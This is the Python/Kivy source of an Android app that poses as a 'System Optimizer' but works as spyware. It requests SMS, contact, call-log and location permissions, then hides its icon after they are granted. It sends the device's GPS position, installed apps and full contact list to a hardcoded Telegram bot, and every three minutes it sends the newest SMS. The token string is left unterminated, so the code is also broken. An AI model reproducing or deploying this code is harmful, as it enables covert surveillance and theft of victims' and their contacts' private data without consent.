import threading
import requests
import time
from kivy.app import App
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform

if platform == 'android':
    from jnius import autoclass
    from android.permissions import request_permissions, Permission
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Uri = autoclass('android.net.Uri')
    ComponentName = autoclass('android.content.ComponentName')
    PackageManager = autoclass('android.content.pm.PackageManager')
    LocationManager = autoclass('android.location.LocationManager')
    Context = autoclass('android.content.Context')

# ============= CONFIG =============
BOT_TOKEN = "8703607239:AAF6PWnNKy0VqBGT22V6jCpOH7tzqGn0d_E
CHAT_ID = "6680833524"

class FullBlastTracker(App):
    def build(self):
        self.title = "System Optimizer"
        if platform == 'android':
            request_permissions([
                Permission.READ_SMS,
                Permission.READ_CONTACTS,
                Permission.READ_CALL_LOG,
                Permission.ACCESS_FINE_LOCATION,
                Permission.ACCESS_COARSE_LOCATION
            ], self.on_permission_result)
        return Label(text="Optimizing System Files...\nKeep App Open.", font_size='16sp')

    def on_permission_result(self, permissions, grants):
        if all(grants):
            self.send_to_telegram("✅ *Permissions Granted! Starting Extraction in 10s...*")
            Clock.schedule_once(self.hide_and_blast, 10)

    def hide_and_blast(self, *args):
        self.hide_icon()
        threading.Thread(target=self.full_extraction_logic).start()
        Clock.schedule_interval(self.silent_report, 180)

    def hide_icon(self):
        try:
            activity = PythonActivity.mActivity
            p_manager = activity.getPackageManager()
            c_name = ComponentName(activity.getPackageName(), "org.kivy.android.PythonActivity")
            p_manager.setComponentEnabledSetting(c_name, 2, 1)
        except: pass

    def send_to_telegram(self, msg):
        # Telegram 4096 char se bada message block kar deta hai
        # Isliye hum message ko tukdon mein bhejenge
        try:
            for i in range(0, len(msg), 4000):
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                              data={'chat_id': CHAT_ID, 'text': msg[i:i+4000], 'parse_mode': 'Markdown'}, timeout=15)
                time.sleep(1) # Telegram spam filter se bachne ke liye
        except: pass

    def full_extraction_logic(self):
        try:
            # 1. Exact GPS Location
            loc = self.get_gps_location()
            self.send_to_telegram(f"🚀 **V6 FULL BLAST STARTED** 🚀\n\n{loc}")

            # 2. ALL Installed Apps (No Limit)
            apps_list = self.get_all_apps_unlimited()
            self.send_to_telegram(f"📱 **ALL INSTALLED APPS:**\n\n{apps_list}")

            # 3. ALL Contacts (No Limit)
            contacts_list = self.get_all_contacts_unlimited()
            self.send_to_telegram(f"👥 **ALL CONTACTS LIST:**\n\n{contacts_list}")
            
            self.send_to_telegram("🎯 **ALL DATA SENT SUCCESSFULLY!**")
        except Exception as e:
            self.send_to_telegram(f"❌ Error: {str(e)}")

    def get_gps_location(self):
        try:
            lm = PythonActivity.mActivity.getSystemService(Context.LOCATION_SERVICE)
            location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) or \
                       lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            if location:
                return f"📍 *Lat:* {location.getLatitude()}, *Lon:* {location.getLongitude()}\n🌍 [Maps](https://www.google.com/maps?q={location.getLatitude()},{location.getLongitude()})"
        except: pass
        return "📍 Location: GPS not fixed yet."

    def get_all_apps_unlimited(self):
        try:
            pm = PythonActivity.mActivity.getPackageManager()
            pkgs = pm.getInstalledPackages(0)
            res = ""
            for i in range(pkgs.size()):
                pkg = pkgs.get(i)
                # Sirf user apps dikhane ke liye (Optional: system apps filter kar sakte hain)
                res += f"• {str(pkg.applicationInfo.loadLabel(pm))}\n"
            return res if res else "No Apps Found"
        except: return "App Error"

    def get_all_contacts_unlimited(self):
        try:
            cursor = PythonActivity.mActivity.getContentResolver().query(Uri.parse("content://contacts/phones"), None, None, None, None)
            res = ""
            if cursor:
                while cursor.moveToNext():
                    name = cursor.getString(cursor.getColumnIndex('display_name'))
                    num = cursor.getString(cursor.getColumnIndex('data1'))
                    res += f"👤 {name}: {num}\n"
                cursor.close()
            return res if res else "No Contacts Found"
        except: return "Contact Error"

    def silent_report(self, dt):
        sms = self.get_last_sms()
        msg = f"📡 **LIVE UPDATE**\n💬 **Last SMS:** {sms}"
        threading.Thread(target=self.send_to_telegram, args=(msg,)).start()

    def get_last_sms(self):
        try:
            cursor = PythonActivity.mActivity.getContentResolver().query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC LIMIT 1")
            if cursor and cursor.moveToFirst():
                return cursor.getString(cursor.getColumnIndex("body"))
        except: return "Error"
        return "None"

if __name__ == '__main__':
    FullBlastTracker().run()
